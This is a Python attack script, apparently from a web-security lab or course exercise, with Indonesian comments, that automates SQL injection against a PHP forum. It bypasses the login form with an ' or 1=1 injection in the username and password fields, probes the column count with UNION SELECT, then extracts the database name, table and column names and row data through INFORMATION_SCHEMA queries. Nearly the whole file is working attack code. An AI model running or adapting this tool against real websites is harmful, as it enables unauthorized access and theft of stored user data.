import requests
from getopt import getopt
import sys
from bs4 import BeautifulSoup

session = requests.session() # py attack.py -t http://localhost -u /discussion.php?discussion_id=1 --database --table --column

TARGET = ""
URI = ""
DATABASE = False
TABLE = False
COLUMN = False
DATA = False
DUMP = False
COLUMN_COUNT = 0
DATABASE_NAME = ""
TABLES = []
COLUMNS = []
DATAS = []

def get_column_count():
    global COLUMN_COUNT
    full_url = TARGET + URI + " UNION SELECT "
    for i in range(1, 10):
        if i != 1:
            full_url += ", "
        full_url += str(i)
        # print(full_url)
        resp = session.get(full_url)
        soup = BeautifulSoup(resp.text,"html.parser")
        container = soup.find("div", attrs={"class" : "container content"})
        # print(container.text.strip())
        if container.text.strip() != "":
            COLUMN_COUNT = i
            break
    print("Total column count: ", COLUMN_COUNT)

def attack():
    global DATABASE_NAME, TABLES, COLUMNS, DATAS
    if DATABASE or DUMP:
        # DATABASE() : balikin database yang sedang digunakan, coba otak atik di webnya (UNION SELECT 1,2,DATABASE(),4,5,6,7 LIMIT 1 OFFSET 1)
        full_url = TARGET + URI + " UNION SELECT 1"
        for _ in range(2, COLUMN_COUNT + 1):
            full_url += ", CONCAT('<data>', DATABASE(), '</data>')"
        full_url += " LIMIT 1 OFFSET 1"
        # print(full_url)
        resp = session.get(full_url)
        soup = BeautifulSoup(resp.text, "html.parser")
        DATABASE_NAME = soup.find("data").decode_contents()
        print("Database Name:", DATABASE_NAME) # TAMBAHIN --databse DI COMMAND

        if TABLE or DUMP: # SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = 'queueforum'
            full_url = TARGET + URI + " UNION SELECT 1"
            for _ in range(2, COLUMN_COUNT + 1):
                full_url += ", CONCAT('<data>', GROUP_CONCAT(TABLE_NAME), '</data>')"
            full_url += " FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = '%s' LIMIT 1 OFFSET 1"%(DATABASE_NAME)
            # print(full_url)
            resp = session.get(full_url)
            soup = BeautifulSoup(resp.text, "html.parser")
            TABLES = soup.find("data").decode_contents().split(",")
            print("Tables: ", TABLES) # TAMBAHIN --table DI COMMAND

            if COLUMN or DUMP:
                for table in TABLES:
                    full_url = TARGET + URI + " UNION SELECT 1"
                    for _ in range(2, COLUMN_COUNT + 1):
                        full_url += ", CONCAT('<data>', GROUP_CONCAT(COLUMN_NAME), '</data>')"
                    full_url += " FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = '%s' AND TABLE_NAME = '%s' LIMIT 1 OFFSET 1"%(DATABASE_NAME, table)
                    # print(full_url)
                    resp = session.get(full_url)
                    soup = BeautifulSoup(resp.text, "html.parser")
                    columns = soup.find("data").decode_contents().split(",")
                    COLUMNS.append(columns)
                    if DATA or DUMP:
                        array = []
                        for column in columns:
                            full_url = TARGET + URI + " UNION SELECT 1"
                            for _ in range(2, COLUMN_COUNT + 1):
                                full_url += ", CONCAT('<data>', GROUP_CONCAT(`%s`), '</data>')"%(column)
                            full_url += " FROM %s.%s LIMIT 1 OFFSET 1"%(DATABASE_NAME, table)
                            # print(full_url)
                            resp = session.get(full_url)
                            soup = BeautifulSoup(resp.text, "html.parser")
                            array.append(soup.find("data").decode_contents.split(","))
                        DATAS.append(array)
                print("Columns: ", COLUMNS) # TAMBAHIN --column DI COMMAND
                print("Datas: ", DATAS) # TAMBAHIN --data DI COMMAND


opts, _ = getopt(sys.argv[1:], "t:u:", ["target", "uri", "database", "table", "column", "data", "dump"])
# python attack.py -t http://localhost -u index.php

for key, value in opts:
    if key in ["-t", "--target"]:
        TARGET = value
    elif key in ["-u", "--uri"]:
        URI = value
    elif key == "--database":
        DATABASE = True
    elif key == "--table":
        TABLE = True
    elif key == "--column":
        COLUMN = True
    elif key == "--data":
        DATA = True
    elif key == "--dump":
        DUMP = True

# check sudah login atau belum / ada redir dari webnya
resp = session.get(TARGET + URI)
# header("Location: /login.php")
# print(resp.status_code)
# print(resp.url)

if (resp.url != (TARGET + URI)):
    # belum kelogin, ctrl+U di login.php, ambil formnya (baris 20) dan input-inputnya
    soup = BeautifulSoup(resp.text, "html.parser")
    login_form = soup.find("form")
    # print(login_form.find("input",  attrs={"name" : "csrf_token"})["value"])
    # print(login_form.find("input",  attrs={"name" : "action"})["value"])
    # print(login_form["action"], login_form["method"])
    session.request(login_form["method"], TARGET + "/" + login_form["action"], data={
      "csrf_token" : login_form.find("input",  attrs={"name" : "csrf_token"})["value"],
      "action" : login_form.find("input",  attrs={"name" : "action"})["value"],
      "username" : "' or 1=1 LIMIT 1#",
      "password" : "' or 1=1 LIMIT 1#",
    })
    # print(resp.url)
    resp = session.get(TARGET + URI)
    if (TARGET + URI) == resp.url:
        print("Login Successful")
        # mulai proses attack
        get_column_count()
        attack()
    else:
        print("Failed to bypass login")
        # testing di website pake id=0 UNION SELECT 1,2,3,4,5,6,7   ATAU   ORDER BY = 1 ....
    
    